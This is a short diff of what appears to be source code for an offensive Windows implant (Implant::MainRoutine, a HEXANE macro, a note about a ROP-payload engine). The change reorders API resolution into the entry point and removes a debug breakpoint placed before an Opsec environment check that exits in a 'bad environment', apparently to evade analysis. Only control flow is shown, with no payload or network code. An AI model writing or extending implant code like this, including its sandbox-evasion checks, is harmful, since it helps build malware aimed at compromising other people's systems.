@@ -2,7 +2,13 @@
 // todo: the idea for "ROP-Engine" is just to make writing rop payloads/programming easier. (Deisl)
 
 VOID Entrypoint(HMODULE Base) {
+    HEXANE
+
     Memory::ContextInit();
+    Memory::ResolveApi();
+    if (ntstatus != ERROR_SUCCESS) {
+        return;
+    }
     Implant::MainRoutine();
 }
 
@@ -13,11 +19,6 @@ namespace Implant {
 
     VOID MainRoutine() {
         HEXANE
-
-        Memory::ResolveApi();
-        if (ntstatus != ERROR_SUCCESS) {
-            return_defer(ntstatus);
-        }
 
         Implant::ReadConfig();
 
@@ -30,7 +31,6 @@ namespace Implant {
             }
 
             if (!Ctx->Session.Checkin) {
-                __debugbreak();
                 Opsec::SeCheckEnvironment();
                 if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                     return_defer(ntstatus);
